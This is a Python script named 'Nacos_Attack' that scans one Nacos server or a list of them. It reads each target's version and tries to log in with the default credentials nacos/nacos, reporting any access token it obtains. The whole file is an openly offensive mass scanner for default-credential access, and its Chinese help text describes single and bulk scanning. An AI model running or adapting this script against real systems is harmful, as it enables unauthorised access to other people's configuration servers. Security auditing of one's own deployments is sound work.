import requests
import sys, getopt
import json
from colorama import init,Fore

banner = r"""
  _   _                                           _      _     _                    _    
 | \ | |   __ _    ___    ___    ___             / \    | |_  | |_    __ _    ___  | | __
 |  \| |  / _` |  / __|  / _ \  / __|           / _ \   | __| | __|  / _` |  / __| | |/ /
 | |\  | | (_| | | (__  | (_) | \__ \          / ___ \  | |_  | |_  | (_| | | (__  |   < 
 |_| \_|  \__,_|  \___|  \___/  |___/  _____  /_/   \_\  \__|  \__|  \__,_|  \___| |_|\_\
                                      |_____|                                            
                                    by @g0ubu1i"""
init(autoreset=True)
def get_verison(url):
    url = url + "/nacos/v1/console/server/state"
    response = requests.get(url)
    try:
        data = json.loads(response.text)
        return data['version']
    except:
        return "Unknown"
def check_access(url):
    try:
        _ = requests.get(url)
        return True
    except requests.exceptions.ConnectionError:
        return False
def check_weak_passwords(url):
        url = url+ "/nacos/v1/auth/users/login"
        data = {"username":"nacos","password":"nacos"}
        res = requests.post(url,data=data)
        if "accessToken" in res.text:
            data = json.loads(res.text)
            accessToken = data['accessToken']
            return accessToken
        return False

def main():
    print(banner)
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hu:l:",["ifile=","ofile="])
    except getopt.GetoptError:
        print('nacos_attack.py -u url')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('''Nacos_Attack.py -u url     单个扫描\nNacos_Attack.py -l url.txt 批量扫描''')
            sys.exit()
        elif opt in ("-u", "--url"):
            url = arg
            method = "only"
        elif opt in ("-l", "--list"):
            urls = arg
            method = "mass"
    if method == "mass":
        with open(urls, 'r') as f:
            for line in f:
                url = line.strip()
                if "http" not in url:
                    url = "http://"+url
                if not check_access(url):
                    pass
                else:
                    accessToken = check_weak_passwords(url)
                    if accessToken != False:
                        print(Fore.GREEN+f"[+] {url}/nacos Weak password found:  nacos/nacos")
    if method == "only":
        if not check_access(url):
            print(Fore.RED+"[-] Target is not accessible")
            sys.exit()
        print(Fore.GREEN+"[+] Target is accessible")
        version = get_verison(url)
        if version == "Unknown":
            print(Fore.RED+"[-] version not found")
        else:
            print(Fore.GREEN+"[+] version: "+version)
        accessToken = check_weak_passwords(url)
        if accessToken != False:
            print(Fore.GREEN+"[+] Weak password found:  nacos/nacos")
        else:
            print(Fore.RED+"[-] Weak password not found")

if __name__ == "__main__":
    main()